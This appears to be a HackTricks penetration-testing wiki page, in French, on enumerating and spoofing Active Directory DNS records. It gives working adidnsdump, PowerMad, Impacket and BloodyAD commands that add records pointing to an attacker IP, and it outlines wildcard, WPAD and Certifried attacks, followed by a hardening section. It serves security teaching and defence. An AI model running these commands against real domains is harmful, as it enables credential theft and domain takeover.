# AD DNS Records

{{#include ../../banners/hacktricks-training.md}}

Par défaut, **tout utilisateur** dans Active Directory peut **énumérer tous les enregistrements DNS** dans les zones DNS de domaine ou de forêt, similaire à un transfert de zone (les utilisateurs peuvent lister les objets enfants d'une zone DNS dans un environnement AD).

L'outil [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) permet **l'énumération** et **l'exportation** de **tous les enregistrements DNS** dans la zone à des fins de reconnaissance des réseaux internes.
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (avril 2025) ajoute une sortie JSON/Greppable (`--json`), une résolution DNS multi-threadée et un support pour TLS 1.2/1.3 lors de la liaison à LDAPS

Pour plus d'informations, lisez [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## Création / Modification des enregistrements (ADIDNS spoofing)

Parce que le groupe **Authenticated Users** a **Create Child** sur le DACL de la zone par défaut, tout compte de domaine (ou compte d'ordinateur) peut enregistrer des enregistrements supplémentaires. Cela peut être utilisé pour le détournement de trafic, la coercition de relais NTLM ou même un compromis complet du domaine.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py est fourni avec Impacket ≥0.12.0)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Primitives d'attaque courants

1. **Enregistrement wildcard** – `*.<zone>` transforme le serveur DNS AD en un répondant à l'échelle de l'entreprise similaire à la falsification LLMNR/NBNS. Il peut être abusé pour capturer des hachages NTLM ou pour les relayer vers LDAP/SMB.  (Nécessite que la recherche WINS soit désactivée.)
2. **Détournement WPAD** – ajoutez `wpad` (ou un enregistrement **NS** pointant vers un hôte attaquant pour contourner la Global-Query-Block-List) et proxy de manière transparente les requêtes HTTP sortantes pour récolter des identifiants.  Microsoft a corrigé les contournements wildcard/DNAME (CVE-2018-8320) mais **les enregistrements NS fonctionnent toujours**.
3. **Prise de contrôle d'entrée obsolète** – revendiquez l'adresse IP qui appartenait auparavant à un poste de travail et l'entrée DNS associée continuera à se résoudre, permettant des délégations contraintes basées sur les ressources ou des attaques Shadow-Credentials sans toucher du tout au DNS.
4. **Falsification DHCP → DNS** – sur un déploiement par défaut de Windows DHCP+DNS, un attaquant non authentifié sur le même sous-réseau peut écraser n'importe quel enregistrement A existant (y compris les contrôleurs de domaine) en envoyant des requêtes DHCP falsifiées qui déclenchent des mises à jour DNS dynamiques (Akamai “DDSpoof”, 2023).  Cela donne un accès machine-intermédiaire sur Kerberos/LDAP et peut mener à une prise de contrôle complète du domaine.
5. **Certifried (CVE-2022-26923)** – changez le `dNSHostName` d'un compte machine que vous contrôlez, enregistrez un enregistrement A correspondant, puis demandez un certificat pour ce nom afin d'usurper le DC. Des outils tels que **Certipy** ou **BloodyAD** automatisent entièrement le processus.

---

## Détection et durcissement

* Refuser aux **Utilisateurs authentifiés** le droit *Créer tous les objets enfants* sur des zones sensibles et déléguer les mises à jour dynamiques à un compte dédié utilisé par DHCP.
* Si des mises à jour dynamiques sont nécessaires, définissez la zone sur **Sécurisée uniquement** et activez la **Protection des noms** dans DHCP afin que seul l'objet ordinateur propriétaire puisse écraser son propre enregistrement.
* Surveillez les ID d'événements du serveur DNS 257/252 (mise à jour dynamique), 770 (transfert de zone) et les écritures LDAP vers `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Bloquez les noms dangereux (`wpad`, `isatap`, `*`) avec un enregistrement intentionnellement bénin ou via la Global Query Block List.
* Gardez les serveurs DNS à jour – par exemple, les bugs RCE CVE-2024-26224 et CVE-2024-26231 ont atteint **CVSS 9.8** et sont exploitables à distance contre les contrôleurs de domaine.

## Références

* Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, toujours la référence de facto pour les attaques wildcard/WPAD)
* Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Déc 2023)
{{#include ../../banners/hacktricks-training.md}}
